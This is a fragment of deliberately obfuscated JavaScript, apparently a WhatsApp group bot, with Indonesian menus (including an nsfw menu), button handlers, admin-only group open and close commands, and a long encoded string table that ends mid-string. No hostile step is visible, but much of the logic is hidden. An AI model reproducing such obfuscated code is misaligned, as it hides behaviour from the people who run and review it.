alpha['sendMessag'+'e'](from,_0x277ffc,image,{'thumbnail':Buffer[_0x249944(0x30c,0x3bd,-0x105,0x616)](-0x2b*-0x25+0x36*-0x81+0x14ff),'quoted':_0x4afcd2,'caption':ini_bayar,'contextInfo':_0x1d4f8});},{soundmenu,groupmenu,quotesmenu,animemenu,coganmenu,helpmenu,convertmenu,funmenu,downloadmenu,makermenu,textpromenu,photooxymenu,telestiker,othermenu,ownermenu,set_stc_cmd,storagemenu,cecanmenu,tagmenu,upmenu,nsfwmenu,asupanmenu,image_effect,allmenu}=require(_0x15af3d(0x3a8,0x744,0x6f5,0x57d)+_0x134458(0x4b7,0x577,0x44,0x436)),isBtMsg=type=='buttonsRes'+'ponseMessa'+'ge'?mek['message'][_0x15af3d(0xc6d,0xe61,0xecb,0x1045)+'ponseMessa'+'ge'][_0x15af3d(0x8bd,0x9b8,0x406,0xb5c)+_0x134458(0xae9,0xee4,0x7c0,0x724)]:'',isStMsg=type=='listRespon'+'seMessage'?mek[_0x134458(0x679,0x91b,0x6dd,0x279)][_0x134458(0xb1b,0x861,0x769,0x6a8)+'seMessage'][_0x134458(0x502,0x258,0x377,0x922)]:'',stc=mek[_0x15af3d(0x7cc,0xc57,0x370,0x94d)][_0x15af3d(0x3a5,0x58c,-0x92,0xcf)+_0x134458(0x9a3,0xcb3,0xda6,0x727)],msc=mek[_0x134458(0x679,0xa43,0xa71,0x1b4)][_0x15af3d(0x483,0x5d9,0x827,0x4b4)+'ge'];wew=fs['readFileSy'+'nc'](_0x134458(0x76f,0xa0d,0xab3,0x6e1)+thumbnail),alfa2=_0x15af3d(0x460,0x164,0x8e9,0x27e)+_0x134458(0xaaa,0xad5,0xf20,0xbea)+_0x15af3d(0x2ca,0x336,0x767,0x6d0),alfa3=_0x15af3d(0x5d6,0x76b,0xa8f,0x547)+_0x134458(0x661,0x7d3,0x8b9,0x3b8)+_0x15af3d(0x2ca,-0xf6,-0x1a4,-0x1b6),sub_yt_zeeone_ofc=type==_0x15af3d(0xc6e,0xd75,0xf54,0x9b7)+'seMessage'?mek[_0x15af3d(0x7cc,0xc54,0xbcb,0x763)]['listRespon'+_0x15af3d(0xa80,0xe5f,0x7bb,0xea0)]['title']:'',subscribezeeoneofc=type==_0x134458(0xb1a,0xfe1,0x7c1,0xe54)+'ponseMessa'+'ge'?mek[_0x134458(0x679,0x3f6,0x480,0x987)][_0x134458(0xb1a,0xa21,0x721,0x858)+_0x134458(0x868,0x9cd,0x482,0xa58)+'ge'][_0x15af3d(0x3d9,-0x3,0x8af,0x1f6)+_0x134458(0x5f9,0x422,0x52f,0x1dc)]:'';if(sub_yt_zeeone_ofc==_0x15af3d(0xc56,0xc52,0x7e5,0x7c1)){console['log'](color(time,_0x15af3d(0x7a0,0x4b6,0x492,0x341)),color(_0x134458(0x2cc,0x4a7,0x3f9,-0xfd)+_0x15af3d(0x3a3,0x728,0x79c,0x30d)+_0x15af3d(0xa47,0xaf8,0x606,0xbc3)));if(!isBotGroupAdmins)return reply('```Jadikan'+_0x134458(0x7fb,0x86f,0x60e,0x9e5)+_0x15af3d(0x774,0xa2f,0x596,0x62a)+_0x134458(0x39b,-0xfd,-0x157,0x449)+'hulu```');await alpha[_0x134458(0x280,0x705,0x596,0x3af)+_0x134458(0x79b,0xbdb,0x65b,0x598)](from,GroupSettingChange['messageSen'+'d'],![]),fakegroup(_0x134458(0x19d,0x3c1,-0x1eb,0x621)+'FULLY\x20OPEN'+_0x134458(0x6d2,0xb89,0x4b3,0x771)+'``');}if(sub_yt_zeeone_ofc==_0x15af3d(0x97c,0x569,0x682,0x7ec)+'e'){console[_0x134458(0xa47,0x6f4,0xc1f,0x6d2)](color(time,_0x134458(0x64d,0x182,0x976,0x792)),color('List\x20messa'+_0x134458(0x6f8,0x286,0xbb7,0x9a6)+_0x134458(0x92b,0x887,0xa9e,0x566)));if(!isBotGroupAdmins)return reply(_0x15af3d(0x872,0x8f3,0xbb8,0x9a3)+_0x134458(0x7fb,0xca3,0x494,0x96f)+_0x15af3d(0x774,0x94f,0x85e,0x9b7)+'erlebih\x20da'+_0x134458(0x928,0xba9,0xdb1,0x7ca));await alpha[_0x15af3d(0x3d3,0x228,0x6c8,-0xdd)+_0x15af3d(0x8ee,0x6eb,0x571,0x652)](from,GroupSettingChange[_0x134458(0x55f,0x349,0x529,0x68e)+'d'],!![]),fakegroup('```SUCCESS'+'FUL\x20CLOSIN'+_0x15af3d(0x79b,0x5be,0x76a,0x3bb));}if(sub_yt_zeeone_ofc==_0x15af3d(0x652,0x48d,0x8cd,0x241)){console['log'](color(time,_0x134458(0x64d,0x9bc,0x58a,0x753)),color(_0x15af3d(0x41f,0x415,0x1d5,0x663)+_0x134458(0xa72,0xb17,0xe1e,0xcf7)+_0x134458(0x93e,0xc21,0x9fe,0x796)));var quotejamzk=await getBuffer(_0x15af3d(0x607,0x9e3,0x61d,0x917)+_0x134458(0x73a,0xc20,0x893,0x524)+_0x134458(0x74c,0x339,0xb6b,0x39b)+_0x15af3d(0xacd,0xd82,0xc65,0xc52)+_0x134458(0x376,0x467,0x1eb,0x4ef));const _0x2931ae={};_0x2931ae[_0x15af3d(0x6ec,0x4e2,0x2b2,0x7d8)+'t']='⋮☰\x20BACK';const _0x40498f={};_0x40498f[_0x15af3d(0xc33,0x1043,0x1064,0xd84)]=_0x15af3d(0x654,0x7f5,0x4c7,0x4f9),_0x40498f[_0x134458(0x454,0x54c,0x3ee,0x3b8)]=_0x2931ae,_0x40498f[_0x15af3d(0xa52,0x8b1,0x8d8,0x8e7)]=0x1;const _0x56e28e={};_0x56e28e[_0x134458(0x599,0x416,0x74f,0x726)+'t']=_0x15af3d(0xb3d,0x8cb,0x6d7,0xa74);const _0x395f52={};_0x395f52[_0x15af3d(0xc33,0x798,0xa47,0xe19)]=_0x134458(0x2c0,0x538,0x1cc,0x2ee),_0x395f52[_0x134458(0x454,0x10d,0x8d9,0x1a5)]=_0x56e28e,_0x395f52[_0x15af3d(0xa52,0xb7a,0x8b8,0xa4d)]=0x1,sendButLocation(from,soundmenu(prefix),''+tampilTanggal+enter+tampilWaktu+enter+enter+_0x134458(0x9e8,0xbaf,0x592,0xe1e)+ini_mark[_0x134458(0x3ec,0x76b,0x1e0,0x2fb)]('@')[0x1*-0x19d5+0x1aa8+-0xd3],quotejamzk,[_0x40498f,_0x395f52],{'contextInfo':{'mentionedJid':[ini_mark]}}),await limitAdd(sender,limit);}if(sub_yt_zeeone_ofc==_0x134458(0x57c,0x854,0x13a,0x5ef)){console[_0x134458(0xa47,0x769,0xf11,0xb14)](color(time,_0x134458(0x64d,0x43c,0x7df,0x935)),color('List\x20messa'+'ge\x20quotesm'+_0x134458(0x93e,0x455,0x7cc,0x645)));var quoteamzk=await getBuffer('https://te'+_0x134458(0x73a,0xa07,0x989,0x7f3)+_0x134458(0x7ed,0xa29,0x80f,0x60b)+_0x134458(0x604,0x7af,0x30a,0x77a)+_0x15af3d(0x2ce,-0x8f,0x58e,-0x1bb));const _0x533368={};_0x533368[_0x15af3d(0x6ec,0x951,0x978,0x73b)+'t']=_0x134458(0x905,0xb07,0x74a,0xbf6);const _0x1d1547={};_0x1d1547[_0x15af3d(0xc33,0xc09,0x95a,0xadd)]=_0x134458(0x501,0xa4,0x120,0x5da),_0x1d1547['buttonText']=_0x533368,_0x1d1547[_0x134458(0x8ff,0x86c,0x51f,0x4ae)]=0x1;const _0x50da7f={};_0x50da7f['displayTex'+'t']='✓\x20OWNER';const _0x2d00c3={};_0x2d00c3[_0x134458(0xae0,0xe30,0x890,0xdd5)]=_0x15af3d(0x413,0x3bb,0x78c,0x2c2),_0x2d00c3[_0x15af3d(0x5a7,0x143,0x282,0x67c)]=_0x50da7f,_0x2d00c3[_0x15af3d(0xa52,0xc82,0x6b6,0xb77)]=0x1,sendButLocation(from,quotesmenu(prefix),''+tampilTanggal+enter+tampilWaktu+enter+enter+'Regard\x20@'+ini_mark[_0x134458(0x3ec,0x512,0x8de,0x489)]('@')[-0x112d*-0x2+-0x1cb1+-0x5a9],quoteamzk,[_0x1d1547,_0x2d00c3],{'contextInfo':{'mentionedJid':[ini_mark]}}),await limitAdd(sender,limit);}if(sub_yt_zeeone_ofc==_0x134458(0x7da,0xc87,0xc7b,0xa32)){console[_0x134458(0xa47,0x607,0x7a6,0x9ea)](color(time,'magenta'),color(_0x134458(0x2cc,0x9,0x4da,-0x49)+_0x15af3d(0xbc5,0xc97,0xbed,0x77e)+_0x134458(0x93e,0x90a,0x630,0x473)));var jakkja=await getBuffer(_0x134458(0x4b4,0x199,0x309,0x3f)+_0x15af3d(0x88d,0x75a,0xd7d,0x84c)+_0x134458(0x7f2,0x49d,0xc57,0x521)+'fb7e261a68'+_0x15af3d(0x440,0x191,0xe1,0x2e5));const _0x436149={};_0x436149[_0x15af3d(0x6ec,0xb3b,0x2f9,0x246)+'t']=_0x15af3d(0xa58,0x59a,0xcc3,0x916);const _0x56d2bf={};_0x56d2bf[_0x134458(0xae0,0xda5,0x63b,0xde9)]=_0x15af3d(0x654,0x8ba,0x57e,0x232),_0x56d2bf[_0x15af3d(0x5a7,0x16c,0x754,0x4e3)]=_0x436149,_0x56d2bf[_0x15af3d(0xa52,0xda0,0xb8a,0x976)]=0x1;const _0x1aa04a={};_0x1aa04a['displayTex'+'t']=_0x134458(0x9ea,0x85f,0x9e2,0x90f);const _0x3de04c={};_0x3de04c[_0x134458(0xae0,0xd2a,0x892,0xfcd)]='owner',_0x3de04c[_0x15af3d(0x5a7,0x52f,0x8aa,0x400)]=_0x1aa04a,_0x3de04c['type']=0x1,sendButLocation(from,groupmenu(prefix),''+tampilTanggal+enter+tampilWaktu+enter+enter+_0x15af3d(0xb3b,0xbe9,0x9d6,0x8c0)+ini_mark[_0x134458(0x3ec,0x352,0x305,0xbc)]('@')[-0x1*-0x702+-0x20*-0x6b+0xa31*-0x2],jakkja,[_0x56d2bf,_0x3de04c],{'contextInfo':{'mentionedJid':[ini_mark]}}),await limitAdd(sender,limit);}function _0x5499(){const _0xf13ca0=['ysbHDgf1ihbHAW','Cgjwwwq','AcbKyxrHBMCSia','DgvSzwDYyw0GCW','CMDHyNvUzYbKyq','AxPL','m0zXjtne','Bxa0','Ct0WlJaX','ihbLCMX1igHHCG','jMLTCg9ZDg9Ypq','8j+KPsbZzxrPyxaGBG','DgHHAwXHBMq','zgvWyw4GDgfRia','CMPHyw4GC2vIzq','A0jmDfe','Bg9N','z29VC2u','sgfPiea','CNnHA2L0lxnHAW','rxGGoG','zw5PCYb5yw5Nia','qNv0Dg9Uig1LCW','CM93CW','sevqBuK','AwTHlIbmzwjPAa','zw1xtLe','AwXLl2q0ngqWyW','ysbTzw5NDwjHAa','B3DUzxjRDq','ig1LBMDLCNrPia','C05MDwK','BIbTzw1IyxnHAa','CxjFB3zVmtm','ndy3mdeWuxr2q0Pb','D1zivKC','otLJnwyUANbN','zw1PDw0','wufAzg4','CMLYAq','AYbIAwnHCMeGza','igTLignVD28','ywrPihvKywGGCa','qMfNAwT1lcblyq','l3bFmJaZmNzJEq','yw5NigjVAg9UzW','igTLANvQDxjHBG','igD1BNvUzYWGDa','BguUANm','Ete4','DgLRDg9R','ywy5yZyXmJy1za','ywSGDgf3ysbHAW','y291CgXL','A2LYysb1zgfOla','BwXozK8','zs0Z','4OcCv2fUAxrHignH','BwLTzxr5Cgu','z2uGCxvVDgvZBq','8j+tOcbrCIbdB2rL','zxjHCgeGBwvUAq','BM90zwTZ','igrHBIbTyxnHia','C2fOihbHEwfOia','DcbPDhuGBwvUzq','yxbWig1VzcbRyq','zhvWBNLHlG','4OcCv2fUAxrHihLH','yw5PBwvTzw51','C2fTyNv0igrLBG','mdaW','DwvZDa','A3uGC2fQys4','BIWGA2fSyxuGAW','C2jVyG','8j+qUIaQtgLUAYOGoG','yw4GyNv0Dg9Uia','BgHZsfO','tePSBgy','CxjFz29WyxKXoa','nsbQyw0','u2v3ysdIMju','tvaZ','qwD1C3r1CW','AxqGAxmGChjLCW','zgvZy3jPChrPBW','DhuGywrHBgfOia','AweGt1zplcbeqq','ChvZAa','B3bHEteZ','xWOk','BMCGy2fUDgLRia','8j+sTIbeyw5H','ChjVzhvJDa','BwfW','cGPFug93zxjLza','zgfRihvUDhvRia','EuLpvhu','igTLigTHBxuU','zhuSigLUAsbIzq','ywDL','ysbKzw5Nyw4GBq','BwfRysbHA2fUia','AYbZzwjLBgfOia','ywXHAcbRzxnHBa','igPHzgKGCgfJyq','idOQidq4mgTICa','igjPBgfUzYaIyq','ChjLCgfYzu1LCW','cVcFJiaGvxjSidOG','CML0ywfU','A2fSAsblzw5Hia','zs04','yw4GBwvUDsbJBW','nteZqhmUD2HHDa','CgLUDgvYzxn0','yw5NigTHBgKUia','AwXLl2fKnZDJmq','te9brevsiooaJs0T','cUkaOIbiqurtcUkaOIa','A1n1ALi','u2nVCMu','AcbZyxr1','4OcCtwfUDxnPysbP','BgvZ','ztKXzdmYnwe3ma','lcb0yxbPihnLyG','ywL1BxuU','CgHKv1K','sMLRysbRyw11ia','AYbZDxn1ihnLyG','ANHer1G','EvzSzhy','Ahr0Chm6lY90Aq','A3vYC2KSihnLBq','zxrHBMDNys7IGj0','yMfLA2H5Dw5N','z2vHExvIAq','rgLTyw5HChvUia','Awr1CgfUigTPDa','se5eCuK','AwXLlZyXmdi0nq','ysa6cJeUiej1AW','yNnpv0S','vgLKywSGywrHia','t1jQBuG','Dsb3yw50ihrVia','CMDPlG','Dw1LBNqUChjLCW','z2fUignHCMeGAW','EwfUyq','BgfTBNLHigfRDq','ihLHBMCGDgvYDa','quSGqK9it05hiG','ywfUlG','nwmYotnJngzKnq','z2vJzW','ExrTCdrHAMfOza','yxzHDgfY','zs0Xoq','uNbxwuS','ihDHBNqGDg8Gza','BMeGyMvYAhvIDq','CxvVDgvK','z2uGyw5PBwvTzq','y29Kzq','Aw0GBxvUz2TPBG','yxn1A2fUigjLBa','yNv0Dg9Uswq','ysbKAsbUzwDHCG','z01uBue','v2j5sLi','z2uGCgHVDg9VEa','igHPzhvWigXLyG','Aw1Hz2uGzwzMzq','idOQideWodbRyG','sw10C1e','C3bSyxLuzxH0','qw5KysbTzw5Qyq','zgfUzYbKAwTPCG','Ahr0Chm6lY95BW','BMDHBIbZyw1Wyq','Ahr0Chm6lY9OlG','4OcCq2fYAwXHAcbP','igDHAYbUz2vYDa','zw51ignVBw1HBG','xWRIGkiGtM9TB3iG','yxiGA2fTDt8','BMvYsMLK','C2fNzuzYB21dBW','yxn1CgfUig1LBG','zxrPAYbaDMvYAq','vMjXDfy','ANvUz2TVB2S','DwSGBwvTAwXPAW','AgfKyxaGC2vZyq','CMvJB3jKihzVAq','rMToANi','yw5NigjPC2eGBq','yMfUEwfRlUkaNsaO','Bxb1CM5HigfRyq','DsbTDw5NA2LUia','C2fSywHHBIWGyW','z3jVDxaGB3bLBG','yMf5yxjFzgfUyq','A1bPstmVwhHHCG','CgfUDgLLCW','C2vWzxj0AsbZzq','mebZlNDOyxrZyq','u3vIie1LBNuGAW','sgHgDei','sNvUAq','BwLTzq','yxmGAxr1igfKyq','AgfSihLHBMCGyG','zwnHBI8','ywSGDgfRDxqGBq','yM90p/cFPjqGqM9VBG','AwGHierVBID0ia','C2fNzsbtzxDHia','CMvZDwX0CW','yseGvxbNCMfKzq','y2HHBM5LBc9vqW','ihbLCMnHEweGza','yxbPig1LBwjHBG','DgfP','yNv0Dg9UC1jLCW','BgLZDfjLC3bVBG','yxiGyNvUz2eGAW','nZu2mtzLnMfJoq','B3jIyw5HBIbTDq','lw9MzMLJzwrVyW','lYbcyxLHCGOZlG','Dg9YEq','wxvAA0q','Ahr0Chm6lY9Oyq','AMvSzwSSigPHBG','DhuGzgLHihvUDa','yxnZ','BM11ihLHBMCGyq','CgHVDg9VEhLTzq','BwzNvxu','txz2yvC','yw4GDgv0yxaGCW','BgfUys7IGj0','C0fWCc0','zKXAz2O','yMvUzwrPy3q','DdeWmda','zwjPAcbIzxnHCG','B3nVzNqT','C2fTysbZAwfWyq','ysbSzwjPAcbRzq','DgfODsbRDw5JAq','BMrPCMKU','tvDsuvG','A2fUigLZDhjPBG','tgLUAYboEweGtq','yxrRyw4HkG','yNv0Dg9UC01LCW','z2v0rgf5','CNvUDgLTzq','CM5HAcbQyxr1Aa','zw5HDgfWig1HDa','Ahr0Chm6lY9HBa','ChjPy2vbBw91BG','DwWSigT1CMfUzW','AwXLlZe1otLMnq','ANbLz1rODw1IBG','D0eWBw8','CMjcv2y','BgvIAwGGzgfYAq','BweTC2fTys4','8j+qUIbmAw5RidOG','ig5Lz2fYysb0zq','zMzLy3q','B2fKAw5NigzPBa','AwrLEc0','rw1VAMKTtwLJCG','cGPFrM9YihrOzq','zxjVCKXPBMS','yw5NigTHBxuGyq','kL9dB3DVxYO','igrHBIbnyxn1AW','C2vKAwTPDcbKyq','igrPCMKGC2vUza','z2v0uxvVDgvKtW','B2yGBw9Yzsb0Aa','CNvZihrLDgfWia','igrPzgfSyw0GzW','refoqs4knc4Gza','yw5NlxbHC2fUzW','BwXmAhO','AMfKAsbVCMfUzW','mtG4otnQuKzHC2i','ywGGC2f0DsbHBG','z2hIGj0','C2fWCc5Uzxq','Bg93jMfWAwTLEq','zxXYzwr8D2HPDa','BwvUzw11A2fUBG','otG0zJKUANbN','Dw5NAsb0yw5Wyq','iezPC2LRys4Gta','8j+sJcaQrM9SBg93zq','yw11ihnHA2L0ia','ysaYncbQyw0','iaRWN46difnPEMuGoG','ywrHigfRAgLYBG','Cc5Uzxq','B3fZsfa','zNjVBu1L','zw5KAwrPAYbZzq','Aw9U','CM5HAcbRyw11ia','g1SXoZmXBx4BwW','8j+qQcbpD25LCG','C2fRDxjH','u2vKzxjOyw5Hia','y2uGyMfJysbZDq','Ag9SB3LLCM8','BMeGA2fSyxuGCW','AwXLlZrKzMm5yG','C2GVCgfJyxiGCW','AM9TyMXV','Dhj5qwDHAw4','C2fNzsbTzw51','BMrHAsbJzw1IDq','CNvVCa','CxjFz29WyxKXmW','zs0Y','zgfSywGGCgvUzW','z2fJAgeGy29Nyq','ywDPihbYAweGyq','ihrHCgKGDgLKyq','ygbGu1vdq0vtuW','z2uGDgfNBwvUDq','jMrHDge9jtDcjq','DKvqy2q','l3bFmJaZmJv5Ca','zMjKBa','Bw9YzsbXDw90zq','ywnHidmWig1LBG','4OcCq2fYysb0zxjI','ysbKzw5Nyw4GAW','4OsIWQKGFca','A2jWCYK','4OcCs2vNywDHBgfU','zsb0AguGC291BG','mJjVChrPB25Zjq','xWOkkLbbwu1ftG','As16zwvVBMvVzG','CgeGywPHigrPDa','rgvUz2fUigrLBq','BgLZyq','zsb0AguGzNvUBq','CgfNzunVDw50','Eg1SzM9YBwf0CW','BMfOig1LBMnVyG','rgvZzw1Izxi','AM9PBG','igrHDgfIyxnLlG','otDTl2DKA1GVra','As1SywTPig1HDq','DhuGAhvIDw5Nyq','rw1YB3i','ELvlCxe','AwDZDg9YEq','yM9KEq','yw4GEwfUzYbIyq','lIbtzwjHyIbQAq','BKXoz1O','zKDKALG','A2fYzw5Hig1LCG','zw4/DhLWzt1JAa','wujSDKu','lvbmqvKGtvaZkG','Dxr1lMjLl0vsrW','Dhf0BW','zMX5DM4','BwLZA2LUihrPza','sezMvMq','yxL1EMf3yq','lIbvBNr1AYbTzq','zs0Ymq','l3bFmJaZmMnMmq','sMfeEgK','mMuXlMPWzW','ysWGBwfRysbbBG','C2XPBsKGCgvYBG','A2uGqMvOysKGyq','yMXVD2PVyG','zwHHDcWGDgvYza','C2vUyw5NlG','oIbFqa','A3v0Aw4','s2L0ysb0AwrHAW','zJmXmtmYote3za','CMeGz2fYysbZAq','BhuGC2LOig5HBq','zghIGkzRzwjVAg9U','BNqGrgfUyq','CM93swq','zYbZB2SGDgf1la','ywrHBgfOihLHBG','q0DTBLO','ExrTCdnKB2mG','DsbIAwXHBMCGyG','DgvYBw90AxzHCW','yNfSEKS','AxrHigfKywXHAa','ywT1A2fUigjPCW','igfRyxiGDw50Dq','CMvTAxvTihnHAG','zgf0yq','AMfOEq','ANnVBG','zML6reO','y3vYCMvUy3LdBW','zw50zwqGAw4GDa','tgLJDK8','uvnOsLi','rKveDwm','A2eGthvWysbqyq','qLKGwKvft05fia','qMfOywDPywXHAa','zgeGzgLYAsbZzq','CgeGA2L0ysbZAq','zgfOlIbcAwfYlG','s2ik8j+nGYbwAwv3CW','vgnbEvG','AgfUBgfOihrLCG','C2vZig1HA2eGBa','igrHBIbTzxjLBG','zgeGDwfUzYb5yq','A29ZlMXPzMuVyq','zMLSzvnOyti1nG','kKnLD2uQ','yxL1A2K','zgKGD2eVDgvSzq','Dwnys3G','rLPsqMu','8j+qOYbuAxrSzsa6ia','yxrbwxa','vgvYyNvRysb1BG','iefUzgeGAwfSyq','nfC1zLLYAMjLyq','CIa/4OcD','AgntvMG','zYbWyxmGBhuGBa','ihnLBwfRAw4GyW','BNLHig1LBgLUza','DMLKzw8GAw5Pia','DgL0CW','BMCGoIOG','BwfUz2f0igfKyq','AhvNla','AMHVCgu','igL0DsbRDw5PBG','zgfYihrPzgfRia','yw1VBMD1CW','8j+tJsboyw1HidOGqa','lcbZDxbHEweGCW','zguGzgLHDgfZia','BwWUzg9JDw1LBG','C2fTysbIzxjZyq','ExrTCdnKB2m','uefz','BY1RndbrlwDpxW','BwLUAMfTA2fUia','lcb3ywT0DsbTzq','Bwv3DwP1zgTHBG','AwDMB3rV','yEkaPK1HC2LOigfK','yw4Gzgf0yw5Nia','quTjtKfiicHtzq','BhvOyw4','zw5Nyw4GBwvTyG','igPHBwLUyw4GAW','vKvssuzz','BNrPAYbIDwTHBG','BgfUz3n1BMDFza','8j+sJcbjBMzVCM1HDa','zwTHCMfUzYbKzq','C3bHBq','yw4SigrHBIbPBq','zsbUB21VCIbHAG','ig5VBw9Yx3n1CG','AweU','ie9wtYb2AweGsa','jMnVBg9YpxLLBa','yJK1mdKUANbN','ig1LBMPHzgKGiG','C29SB2C','odHMowuUANbN','zMnwv2S','BMDHBIb5yw5Nia','z2uGC3rVCMfNzq','DgvUz2fOigPHBq','zYbRzxjHCYbRzq','s2L0ysbHzgfSyq','CMvSyxLxqu1LCW','x2nOB29Zzsb0Aa','cGPFuMvNyxjKia','yxqUiejPyxiGyq','z2nbBhy','C2LSywHRyw4GAa','DhvRig9Yyw5Nlq','x1r1BMDNDsbIzq','AwXLl2vJodrJyG','DgHPCYbPzIb5BW','z3f6uvC','zuPOrKG','yxnSywGGzgvUzW','z2uGz3jVDxaGBW','odm1mZG5EvbhEhPd','C3rPy2TLCK1LCW','CMqGzgfUifzPCW','yw4GywTHBIbIzq','lI96zwvVBMuVEG','AsbRzwTHEwfHBG','AcbSAxn0ig1LBG','ywGGz2eGC29Syq','C2fPcGPFuMvNyq','CvPVqxq','yw5NigfKywXHAa','ztu4ytaUANbN','qwT1igjPC2eGCW','zgKGDgfODw4GAq','zgfUzYb0AwrHAW','AMLK','ysWGywDHCIb0zq','ihrHzYbTzw1Izq','y3jPChqGqM90ia','zNv0yw5HCMK','otK5otK5otK5','zgfYAsb5yw5Nia','igTIcVcFJymGvMLLDW','BIbRzwTHEwfHBG','CYdWN5kE','C2fUz2fUigHPza','igXHBwjHDc4GsG','BwvTyNvHDcbRAq','cVcFPkaGsuqGoIa','A3uGz2fRigjPCW','rw1VAMKTzw1VAG','zxbHDcbPysbWzq','AhDWAw0','lIbtzwrHBMDRyq','zMXPBMu','DMLLDg5HBq','BguT','zsbTzwrPysbZzq','DxbTzw51','zsb0AguGz3jVDq','D2fPDa','4OcCu2vTywTPBIbI','ihnHAMeGDgvTyq','yxqGkhnLCMfOia','AwXLlZG1mwu3oq','qMvSyxmGA2fZAq','y2HPBMe','z3jVDxbtzxr0Aq','s2vZywjHCMfUia','iejHEwfYcJmUia','A2fTDsbZzw11yq','uxmUiefSieHHza','DgeGBhvWysWGCW','C2vSzwn0zwrcDq','pwLUzczJzJ1Myq','Ag9SBW','ihnLC2vVCMfUzW','DcWGC2vIzxjHDa','B250B2H8Dhj1zq','C3rVCMfNzw1LBG','DwLKr0q','Dw50DwSGC2vZzq','AgfSig1LBwjHBG','BwvKAwfuExbL','igj1A2fUihrPBG','zw55yxbHBNLHla','l3nTysbQzw5PCW','zM9Yig5LDYbZDa','lI9PBwfNzs8','yMeGDwXHBMDPia','ChjHBMSGy2HHDa','zxnTzw51ignVBq','CMDH','BIbHA3uGEwfUzW','rgLRigPHBMDHBG','D2fUAxrHihnHBq','yNGVBuzfqJHtvW','BwvZC2fNzuLUzG','yw4TDgvTyw5TDq','CLvMvwm','CMvZDwX0','z2uGzNvUBwvUDq','AcWGzgfUihnLyG','zMLSzuvUy1nOyq','A2vPBMDPBMfUia','BxuGyMvSzxvTia','Fgn5yw4','zsb0AguGDgvSzq','A2f0ywrPBgfU','shrTzuW','yxrJy1K','DwTHBIbVBgvOia','zxrJAf9JB250zq','kg1HAw4GyMfYzq','AMfWyw4','DhnHChaUBMv0','zuzUAwm','yxaGyMfZywGU4OcD','zw50yxrPB25TBa','8j+pHsbtB3vYy2uGCW','BMCGA2L0ysbOyq','t2T0B2jLCG','qKfor0vuie5hrW','ExvxtNG','rgTzuLq','BwvUAwTHAcbTzq','AwrHAYbZyw5NzW','BNuGy29TBwfUza','icbnifaGmYOkcG','Dc5JB20VCMvZBW','B3jNEq','B3DUzxi','oIbF','mda1odC','yxLHiefWysbtyq','igPHzgKGiIbctW','BxuGzgvUz2fUia','q2XPy2SGyNv0Da','CMvK','sKLiuMm','zgfUigHPzhvWia','z2fYigHPzhvWia','C2v3ywjVDa','tgLZDcbTzxnZyq','A3uGCgfRzsbJzq','DM4GDhj1CYbRAq','zg9Nzq','Dgf1igjVA2fWpW','Exv6DwTP','DcbKAsbKDw5Pyq','Aw5ZDgfZDg9YEq','z2fUihnLyMfPAW','44cmicPjtLnuquDs','igT1ihvSyw5Nia','BIbRzsbTyw50yq','BxuGEwfUzYbWzq','yMvUyxjUEweGAW','DwXPDcWGDgfWAq','BgPRDuG','zwfYy2HszxnVDq','rw1VAMKTqxbWBa','u2f0DsbQyw0GEq','x1vUDhvRigr1CG','re9d','surs','idOGx0a','zxnWB25Zzq','C3LHBMLH','z0HRqxy','DKr2qwu','ndeYnJy5ofr0t0XWBa','ihLHBMCGy2vYza','DgvSzM9UignYDq','rKLRtgu','jMnVBg9Ypwn5yq','u3nxC2C','ndHHy2mUANbN','zw5NDwfZywKGCa','BMvUzwSGBw95yq','8j+qOYbbBgWGBwvUDq','yMfODgvYysbOAq','zMLSzu5HBwu','CMqGqa','uc1TDs4kmI4Gua','CNuUie1HBgfOyq','ig93BMvYigT1ia','C2LHihLHBMCGCW','yw5KysbTzw5Qyq','8j+sPIbuAxrSzsa6ia','sNvSAq','Aw5ZDgfMB3rV','A290B3jPx21PBG','vNHJsuG','igHPzhvWA3uUia','yxn1A2fUigT1Ba','DgvYlq','uxreqNy','yw1PBMfUihvUDa','yw4UAgvYB2T1yq','Aw5MB2jVDa','igTLigrLCgfUlG','z2uGDxbTzw51','DxjS','ksWGDhvUz2D1ia','ywTHBIbWB3rUEq','4OcCugfRywLHBIbP','ihvUDhvRig1LBG','igfRyw4GAgfUyW','nJi4odi3otu3nq','zs0Xnq','AwXRyw4GBgvIAq','8j+uOIboB21VCG','AKDIzey','runu','ie5HBweGoIbF','rMzXBfu','BMr1BMCSifbHzW','igKGBg92zsb1la','oweYmZzHna','C1Hcvva','sxDxr2e','z2KGCgvTyw5Kyq','z0LTveq','ywDPihLHBMCGAG','yxLHigf0yxuGBq','ys4GqMLZywT1ia','BxuGywrHBgfOia','vgLRDg9RifDnlG','yNv0Dg9UCW','zg9JDw1LBNrnzq','t1zp','AwXLlZK3yJiZnG','zsb0AguGDxbTzq','zhrvsxu','B24GoIa','igrHBgfTihn1yq','B2jIBhm','CKT5CNa','zMq4otyUANbN','ENLMs0q','lMnVBs9HCgK','yxbPl2LTywDLzW','ExrTCdnHAMeG','yxvKAw9nzxnZyq','ig5VBMeGy2fUDa','AMvUBMK','8j+sIYaQrNvSBg5HBq','B3DUzxjTzw51','uMvWBhK','ifnLBw9NysbOyq','DwrPyw4U4OcD','sgfTCgLYihnLBq','CIbVBgvOihnLCG','BwLUDw0GA29WAq','AxHLBhmT','zwXHAMfYyw4U','vwXpq3O','CMf0igfWyxb1BG','xWOkq2fYyw55yq','z2LM','jtiYjtjdjtiYCW','ywrZAgvLDg1SlG','ifrLDgfWAsbQyq','yxbPigTLyMLHCW','kKjst0feq0ftva','Dxr1lMjLlZfpmG','mtKXoq','t0zUC3y','B2zMBgLUzq','rw1VAMKTteCT','z2uGz2fJAgeGyW','zs0Xmq','otK5otK5oq','A2fUig1LBMvYDa','yY96zwvVBMvVzG','idOkms4GqNvRyq','CIb5yw5NignVyW','8j+qOYaQvgL0BguGoG','vxnHz2u6ia','tvnStfO','ysbSDxbHlcbtzq','Bef3te4','4OcCr2fYysbNyxjH','z2v0rgf0zq','kUkCIE+4JYbtAxPLie1W','yMfPAYbKyw4GyG','BNn0ywDYyw0UyW','ysbbBMrHigXHAW','zwXHAMfYyw4GCW','D258y3LHBNXKyq','vMLKzw8GkdCYma','ysbHCgeTyxbHlG','CMvTB3rLsMLK','AsbVBgvOigTLAq','yxbPigfWysbKyq','AwTPCMTHBIbRyq','DsbIDwTHBIb0Aq','ysbWzwX1yw5Nia','zw4TvvmSzw47Cq','DhzZBuW','we9iDKy','ihnHBxbHAsbZyq','z3vUigrHCMKGDa','tMrtENy','ExrTCdqGw2XPBG','Ag9Wzv9IB3K','ihrLCMXLyMLOia','BIbcB3qH','lcbHA3uGDgfRia','wNfMDgG